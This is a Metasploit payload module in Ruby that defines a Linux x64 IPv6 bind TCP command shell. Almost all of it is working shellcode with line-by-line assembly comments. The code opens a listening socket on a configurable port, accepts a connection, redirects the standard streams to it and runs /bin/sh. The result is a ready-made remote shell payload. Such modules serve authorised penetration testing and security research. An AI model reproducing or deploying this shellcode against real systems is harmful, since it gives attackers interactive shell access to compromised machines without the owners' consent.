##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 115

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Command Shell, Bind TCP Inline (IPv6)',
      'Description'   => 'Listen for an IPv6 connection and spawn a command shell',
      'Author'        => 'epi <epibar052[at]gmail.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 21, 'n' ],
            },
          'Payload' =>
            # <_start>:
            "\x6a\x29"                	    +   #   push   0x29
            "\x58"                   	    +   #   pop    rax
            "\x6a\x0a"                	    +   #   push   0xa
            "\x5f"                   	    +   #   pop    rdi
            "\x6a\x01"                	    +   #   push   0x1
            "\x5e"                   	    +   #   pop    rsi
            "\x31\xd2"                	    +   #   xor    edx,edx
            "\x0f\x05"                	    +   #   syscall
            "\x89\xc7"               	    +   #   mov    edi,eax

            # <populate_sockaddr_in6>:
            "\x52"                   	    +   #   push   rdx
            "\x52"                   	    +   #   push   rdx
            "\x52"                   	    +   #   push   rdx
            "\x52"                   	    +   #   push   rdx
            "\x66\x68\x11\x5c"         	    +   #   pushw  0x5c11
            "\x66\x6a\x0a"             	    +   #   pushw  0xa
            "\x54"                   	    +   #   push   rsp
            "\x5e"                   	    +   #   pop    rsi

            # <bind_call>:
            "\x6a\x31"                	    +   #   push   0x31
            "\x58"                  	    +   #   pop    rax
            "\x6a\x1c"                	    +   #   push   0x1c
            "\x5a"                  	    +   #   pop    rdx
            "\x0f\x05"                	    +   #   syscall

            # <listen_call>:
            "\x6a\x32"                	    +   #   push   0x32
            "\x58"                   	    +   #   pop    rax
            "\x6a\x01"                	    +   #   push   0x1
            "\x5e"                   	    +   #   pop    rsi
            "\x0f\x05"                	    +   #   syscall

            # <accept_call>:
            "\x6a\x2b"                	    +   #   push   0x2b
            "\x58"                   	    +   #   pop    rax
            "\x99"                   	    +   #   cdq
            "\x52"                   	    +   #   push   rdx
            "\x52"                   	    +   #   push   rdx
            "\x48\x89\xe6"             	    +   #   mov    rsi,rsp
            "\x6a\x1c"                	    +   #   push   0x1c
            "\x48\x8d\x14\x24"         	    +   #   lea    rdx,[rsp]
            "\x0f\x05"                	    +   #   syscall
            "\x49\x89\xc7"             	    +   #   mov    r15,rax

            # <dup2_calls>:
            "\x6a\x03"                	    +   #   push   0x3
            "\x59"                   	    +   #   pop    rcx
            "\x6a\x02"                	    +   #   push   0x2
            "\x5b"                   	    +   #   pop    rbx

            # <dup2_loop>:
            "\x6a\x21"                	    +   #   push   0x21
            "\x58"                  	    +   #   pop    rax
            "\x4c\x89\xff"             	    +   #   mov    rdi,r15
            "\x89\xde"                	    +   #   mov    esi,ebx
            "\x51"                  	    +   #   push   rcx
            "\x0f\x05"                	    +   #   syscall
            "\x59"                  	    +   #   pop    rcx
            "\x48\xff\xcb"             	    +   #   dec    rbx
            "\xe2\xef"                	    +   #   loop   401046 <dup2_loop>

            # <exec_call>:
            "\x31\xd2"                	    +   #   xor    edx,edx
            "\x52"                   	    +   #   push   rdx
            "\x48\xbb\x2f\x62\x69\x6e\x2f"  +   #   movabs rbx,0x68732f2f6e69622f
            "\x2f\x73\x68"                  +   #
            "\x53"                     	    +   #   push   rbx
            "\x48\x89\xe7"                  +   #   mov    rdi,rsp
            "\x52"                          +   #   push   rdx
            "\x57"                          +   #   push   rdi
            "\x48\x89\xe6"                  +   #   mov    rsi,rsp
            "\x48\x8d\x42\x3b"              +   #   lea    rax,[rdx+0x3b]
            "\x0f\x05"                          #   syscall
        }
      ))
  end
end
